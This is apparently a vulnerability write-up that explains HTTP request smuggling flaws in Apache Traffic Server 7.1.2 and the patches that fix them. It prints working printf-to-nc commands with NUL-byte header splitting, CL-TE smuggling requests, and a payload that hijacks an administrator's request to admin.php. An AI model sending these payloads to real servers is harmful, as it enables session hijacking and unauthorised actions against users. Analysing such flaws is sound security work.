### 3201: Close the Connection When Returning a 400 Error Response

This patch addresses an issue in Apache Traffic Server (ATS) 7.1.2, where a 400 error response does not close the established TCP connection. This vulnerability, as analyzed by regilero in [CVE-2018-8004](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/), can be exploited through HTTP request smuggling.

#### Exploitation Example

To demonstrate the vulnerability, the following command can be used:

```bash
printf 'GET / HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'aa: \0bb\r\n'\
'foo: bar\r\n'\
'GET /2333 HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'\r\n'\
| nc 10.211.55.22 80
```

This command sends a crafted HTTP request to the ATS server, resulting in two 400 error responses. The request is interpreted as two separate requests due to the presence of a `NULL` byte (`\0`):

1. **First Request:**
    ```http
    GET / HTTP/1.1
    Host: ats.mengsec.com
    aa: 
    ```

2. **Second Request:**
    ```http
    bb
    foo: bar
    GET /2333 HTTP/1.1
    Host: ats.mengsec.com
    ```

The first request is truncated at the `NULL` byte, leading to a 400 error. The subsequent data is then treated as the beginning of a new request, which also results in a 400 error due to its non-compliance with the HTTP request format.

#### Modified Test

A modified test can be performed to further illustrate the issue:

```bash
printf 'GET / HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'aa: \0bb\r\n'\
'GET /1.html HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'\r\n'\
| nc 10.211.55.22 80
```

In this case, the ATS server responds with a 400 error for the first request and forwards the second request to the backend Apache server, resulting in a 200 OK response. This behavior can be observed using Wireshark.

#### HTTP Request Splitting Attack

The crafted request can be split into two parts:

```http
GET / HTTP/1.1
Host: ats.mengsec.com
aa: \0bb
GET /1.html HTTP/1.1
Host: ats.mengsec.com
```

However, the middle `GET /1.html HTTP/1.1` does not conform to the `Name:Value` format of HTTP headers. To address this, the `absoluteURI` format specified in RFC 2616 section 5.1.2 can be used:

```http
GET /400 HTTP/1.1
Host: ats.mengsec.com
aa: \0bb
GET http://ats.mengsec.com/1.html HTTP/1.1
```

Sending this request:

```bash
printf 'GET /400 HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'aa: \0bb\r\n'\
'GET http://ats.mengsec.com/1.html HTTP/1.1\r\n'\
'\r\n'\
'GET /404 HTTP/1.1\r\n'\
'Host: ats.mengsec.com\r\n'\
'\r\n'\
| nc 10.211.55.22 80
```

Results in three responses: 400, 200, and 404. The extra 200 response is due to the ATS server processing the second request.

#### Fixing the Vulnerability

To mitigate this vulnerability, the ATS server now closes the TCP connection upon encountering a 400 error. This ensures that subsequent requests do not affect other users.

### 4.3.3: Validate Content-Length Headers for Incoming Requests

In this patch, bryancall describes the following changes:

- Respond with a 400 code when `Content-Length` headers mismatch.
- Remove duplicate `Content-Length` headers with exactly the same values.
- Remove `Content-Length` headers if a `Transfer-Encoding` header exists.

These changes address the incomplete implementation of the `RFC2616` standard in ATS 7.1.2, which could potentially allow `CL-TE` smuggling attacks.

#### Example Request

```http
GET / HTTP/1.1
Host: lnmp.mengsec.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

This request results in a `405 Not Allowed` response after multiple transmissions. The subsequent requests are combined on the Nginx server, leading to an invalid `GGET` request method, which returns a `405` error.

#### Attacking `admin.php`

To attack the `admin.php` endpoint, the following request can be constructed:

```http
GET / HTTP/1.1
Host: lnmp.mengsec.com
Content-Length: 83
Transfer-Encoding: chunked

0

GET /admin.php?del=mengchen HTTP/1.1
Host: lnmp.mengsec.com
attack: 1
foo:
```

After several requests, the response `You are not Admin` indicates that the server processed the `admin.php` request. If an administrator is logged in, their request might look like this:

```http
GET / HTTP/1.1
Host: lnmp.mengsec.com
Cookie: admin=1
```

Wireshark traffic analysis shows that the combined request on the Nginx server looks like:

```http
GET /admin.php?del=mengchen HTTP/1.1
Host: lnmp.mengsec.com
attack: 1
foo: GET / HTTP/1.1
Host: 10.211.55.2:10086
Cookie: admin=1
X-Forwarded-For: 10.211.55.2
Via: http/1.1 mengchen-ubuntu[e9365059-ad97-40c8-afcb-d857b14675f6] (ApacheTrafficServer/7.1.2)
```

The administrator's cookie is effectively deleted, similar to the previous example.

### 4.3.4: Drain the Request Body if There is a Cache Hit

This patch addresses a vulnerability where the ATS server ignores the `Content-Length` header during a cache hit, leading to request smuggling. The request body data is processed as another HTTP request, causing a security issue.

#### Enabling Caching

To test this, enable caching in the ATS server configuration:

```ini
vim /opt/ts-712/etc/trafficserver/records.config
CONFIG proxy.config.http.cache.http INT 1 # Enable caching
CONFIG proxy.config.http.cache.ignore_client_cc_max_age INT 0 # Enable the client Cache-Control header to facilitate control of cache expiration time
CONFIG proxy.config.http.cache.required_headers INT 1 # When the Cache-control: max-age request header is received, the response is cached
```

Restart the ATS server after making these changes.

#### Generating Random Strings

For testing, a script `random_str.php` can be used to generate random strings in the Nginx website directory:

```php
function randomkeys($length){ 
    $output='';
    for ($a = 0; $a<$length; $a++) {
        $output .= chr(mt_rand(33, 126));
    }   
    return $output;
}
echo "get random string: ";
echo randomkeys(8);
```

#### Constructing the Request

Send the following request to exploit the vulnerability:

```http
GET /1.html HTTP/1.1
Host: lnmp.mengsec.com
Cache-control: max-age=10
Content-Length: 56

GET /random_str.php HTTP/1.1
Host: lnmp.mengsec.com
```

This request demonstrates how the ATS server processes the request body as a new HTTP request, leading to potential security issues.